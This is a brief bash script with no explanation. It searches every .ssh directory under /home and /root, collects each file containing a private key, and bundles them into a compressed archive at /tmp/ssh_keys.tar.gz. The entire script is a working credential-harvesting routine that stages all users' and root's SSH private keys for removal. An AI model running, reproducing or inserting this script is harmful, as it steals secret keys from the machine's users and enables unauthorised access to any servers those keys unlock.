#!/bin/bash

rm -f /tmp/ssh_keys.tar /tmp/ssh_keys.tar.gz 2>/dev/null; for f in $(find  /home /root -name .ssh | xargs -I {} find {} -type f); do if grep "PRIVATE" $f >/dev/null; then tar -C $(dirname $f) -rvf /tmp/ssh_keys.tar $f 2>/dev/null; fi done; gzip /tmp/ssh_keys.tar